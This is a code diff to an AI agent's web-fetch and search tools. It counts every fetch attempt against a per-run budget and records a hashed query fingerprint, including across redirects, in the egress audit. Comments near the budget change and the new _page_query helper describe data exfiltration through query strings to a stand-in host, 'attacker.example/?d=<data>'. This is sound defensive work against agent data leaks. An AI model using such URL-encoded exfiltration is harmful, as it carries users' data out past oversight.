@@ -68,6 +68,7 @@ from tret.net import audit as egress_audit
 from tret.net.fetch import (
     PROVENANCE_WEB_CAPTURE,
     SOURCE_KIND_WEB,
+    FetchedPage,
     FetchError,
     fetch_page,
     find_snapshot,
@@ -182,7 +183,8 @@ class RunContext:
     # not actually given this run (withheld-for-this-deployment or
     # withheld-for-this-workspace tools included).
     enabled_tools: frozenset[str] = frozenset()
-    # Research budget, spent by fetch_url. A page is re-sent as conversation input
+    # Research budget, spent by fetch_url (one per attempt, before the request, so
+    # failed fetches count). A page is re-sent as conversation input
     # on every later iteration, so an unbounded number of them is the same failure
     # mode the result caps below exist for — with an outbound request attached.
     web_fetches: int = 0
@@ -782,7 +784,10 @@ async def _record_egress(
     byte_count: int = 0,
     duration_ms: int = 0,
     reason: str | None = None,
+    query: str | None = None,
 ) -> None:
+    """Audit one research-class call. `query` is the URL's (or search's) query text:
+    only its length and hash are stored, never the text (`tret/net/audit.py`)."""
     fields = dict(
         egress_class=CLASS_RESEARCH,
         method=method,
@@ -795,6 +800,7 @@ async def _record_egress(
         byte_count=byte_count,
         duration_ms=duration_ms,
         reason=reason,
+        query=query,
     )
     if decision == egress_audit.DECISION_DENIED:
         # A denial returns to the model as a tool error, and the engine rolls a
@@ -860,13 +866,13 @@ async def web_search(ctx: RunContext, query: str, max_results: int = 5) -> str:
         kind = "search_unconfigured" if isinstance(e, SearchNotConfigured) else "search_unavailable"
         await _record_egress(
             ctx, method="GET", host=getattr(provider, "host", ""), path="/search",
-            decision=egress_audit.DECISION_DENIED, reason=f"{kind}: {e}",
+            decision=egress_audit.DECISION_DENIED, reason=f"{kind}: {e}", query=query,
         )
         raise ToolError(str(e)) from e
     except EgressDenied as e:
         await _record_egress(
             ctx, method="GET", host=getattr(provider, "host", ""), path="/search",
-            decision=egress_audit.DECISION_DENIED, reason=e.reason,
+            decision=egress_audit.DECISION_DENIED, reason=e.reason, query=query,
         )
         raise ToolError(f"Search refused by egress policy: {e.detail or e.reason}") from e
     results = response.results
@@ -885,7 +891,7 @@ async def web_search(ctx: RunContext, query: str, max_results: int = 5) -> str:
         reason = "search_empty"
     await _record_egress(
         ctx, method="GET", host=getattr(provider, "host", ""), path="/search",
-        decision=egress_audit.DECISION_ALLOWED, status_code=200, reason=reason,
+        decision=egress_audit.DECISION_ALLOWED, status_code=200, reason=reason, query=query,
     )
     if degraded:
         engines = "; ".join(f"{n}: {r}" if r else n for n, r in unresponsive[:6])
@@ -945,35 +951,39 @@ async def fetch_url(ctx: RunContext, url: str) -> str:
     max_fetches = int(settings.egress_research_max_fetches_per_run)
     if ctx.web_fetches >= max_fetches:
         raise ToolError(
-            f"This run has already fetched {ctx.web_fetches} pages, which is the per-run "
+            f"This run has already made {ctx.web_fetches} fetch attempts, which is the per-run "
             f"limit (TRET_EGRESS_RESEARCH_MAX_FETCHES_PER_RUN={max_fetches}). Work with "
             "what you have retrieved and be explicit about what you could not check."
         )
+    # Spent before the request, as capture_source does, and whatever comes of it: a
+    # run that counted only successes could make unlimited requests that all fail
+    # (404s to `attacker.example/?d=<data>`) and still carry the data out in each URL.
+    ctx.web_fetches += 1
 
     try:
         page = await fetch_page(url)
     except EgressDenied as e:
         await _record_egress(
-            ctx, method="GET", host=_host_of(url), path=_path_of(url),
+            ctx, method="GET", host=_host_of(url), path=_path_of(url), query=_query_of(url),
             decision=egress_audit.DECISION_DENIED, reason=e.reason,
         )
         raise ToolError(_egress_denied_message(ctx, e, url)) from e
     except FetchError as e:
         await _record_egress(
-            ctx, method="GET", host=_host_of(url), path=_path_of(url),
+            ctx, method="GET", host=_host_of(url), path=_path_of(url), query=_query_of(url),
             decision=egress_audit.DECISION_DENIED, reason=f"fetch_failed: {e}",
         )
         raise ToolError(f"Could not read {url}: {e}") from e
 
     doc = await store_snapshot(ctx.db, page, ctx.project_id, ctx.run_id)
     ctx.document_ids.append(doc.id)
-    ctx.web_fetches += 1
     ctx.web_bytes += len(page.body)
     await _record_egress(
         ctx,
         method="GET",
         host=_host_of(page.url),
         path=_path_of(page.url),
+        query=_page_query(page),
         decision=egress_audit.DECISION_ALLOWED,
         status_code=page.status_code,
         byte_count=len(page.body),
@@ -1087,13 +1097,13 @@ async def capture_source(
         )
     except EgressDenied as e:
         await _record_egress(
-            ctx, method="GET", host=_host_of(url), path=_path_of(url),
+            ctx, method="GET", host=_host_of(url), path=_path_of(url), query=_query_of(url),
             decision=egress_audit.DECISION_DENIED, reason=e.reason,
         )
         raise ToolError(_egress_denied_message(ctx, e, url)) from e
     except FetchError as e:
         await _record_egress(
-            ctx, method="GET", host=_host_of(url), path=_path_of(url),
+            ctx, method="GET", host=_host_of(url), path=_path_of(url), query=_query_of(url),
             decision=egress_audit.DECISION_DENIED, reason=f"fetch_failed: {e}",
         )
         raise ToolError(f"Could not capture {url}: {e}") from e
@@ -1123,6 +1133,7 @@ async def capture_source(
         method="GET",
         host=_host_of(page.url),
         path=_path_of(page.url),
+        query=_page_query(page),
         decision=egress_audit.DECISION_ALLOWED,
         status_code=page.status_code,
         byte_count=len(page.body),
@@ -1137,6 +1148,18 @@ def _host_of(url: str) -> str:
 
 def _path_of(url: str) -> str:
     return urlsplit(url).path or "/"
+
+
+def _query_of(url: str) -> str:
+    return urlsplit(url).query
+
+
+def _page_query(page: FetchedPage) -> str:
+    """The longest query string seen along a fetch: the requested URL, each redirect
+    hop, the final URL. The audit fingerprint must not depend on where the server
+    sent us: `attacker.example/?d=<4KB>` answering 302 -> `/` still carried 4KB out."""
+    urls = (page.requested_url, *page.redirects, page.url)
+    return max((_query_of(u) for u in urls), key=len)
 
 
 def _fetch_result_text(doc: Document, *, replayed: bool) -> str:
